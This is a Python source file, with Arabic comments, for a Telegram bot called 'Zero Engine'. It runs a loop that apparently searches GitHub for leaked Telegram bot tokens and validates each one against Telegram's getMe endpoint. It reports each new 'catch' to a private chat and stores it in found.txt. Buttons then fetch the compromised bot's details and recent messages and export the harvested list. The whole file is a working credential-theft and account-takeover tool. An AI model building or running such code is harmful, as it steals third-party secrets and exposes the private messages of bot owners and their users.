import os, requests, threading, time, telebot
from telebot import types
from scanner import search_for_tokens
from controller import get_bot_info, get_bot_messages

# إعدادات البوت
BOT_TOKEN = os.getenv('REPORT_BOT_TOKEN')
CHAT_ID = os.getenv('CHAT_ID')
GITHUB_TOKEN = os.getenv('GITHUB_TOKEN')
FOUND_FILE = "found.txt"

bot = telebot.TeleBot(BOT_TOKEN)

# --- نظام الكيبورد التفاعلي (Dashboard) ---
def get_markup(token):
    markup = types.InlineKeyboardMarkup()
    # الصف الأول: التحكم في التوكن
    markup.add(types.InlineKeyboardButton("📋 معلومات البوت", callback_data=f"info|{token}"))
    markup.add(types.InlineKeyboardButton("📩 آخر الرسائل", callback_data=f"msg|{token}"))
    # الصف الثاني: تصدير
    markup.add(types.InlineKeyboardButton("📤 تصدير الملف", callback_data="export"))
    return markup

# --- معالجة الضغط على الخانات ---
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    if str(call.message.chat.id) != CHAT_ID: return
    
    if call.data == "export":
        if os.path.exists(FOUND_FILE):
            with open(FOUND_FILE, "rb") as f:
                bot.send_document(CHAT_ID, f)
        return

    action, token = call.data.split("|")
    res = get_bot_info(token) if action == "info" else get_bot_messages(token)
    bot.send_message(CHAT_ID, f"نتائج {action}:\n{res[:4000]}")

# --- محرك الصيد التلقائي ---
def run_scanner():
    print("Zero Engine: Scanning Online...")
    while True:
        try:
            tokens = search_for_tokens(GITHUB_TOKEN)
            for token in tokens:
                # التحقق من عدم التكرار والفعالية
                if not os.path.exists(FOUND_FILE) or token not in open(FOUND_FILE).read():
                    if requests.get(f"https://api.telegram.org/bot{token}/getMe", timeout=5).status_code == 200:
                        # إرسال الصيد مع الخانات (الكيبورد)
                        bot.send_message(CHAT_ID, f"🔥 صيد جديد:\n`{token}`", 
                                         parse_mode="Markdown", reply_markup=get_markup(token))
                        with open(FOUND_FILE, "a") as f: f.write(token + "\n")
        except: pass
        time.sleep(60) # فحص كل دقيقة

if __name__ == "__main__":
    # تشغيل الماسح في الخلفية
    threading.Thread(target=run_scanner, daemon=True).start()
    # تشغيل البوت
    bot.infinity_polling()
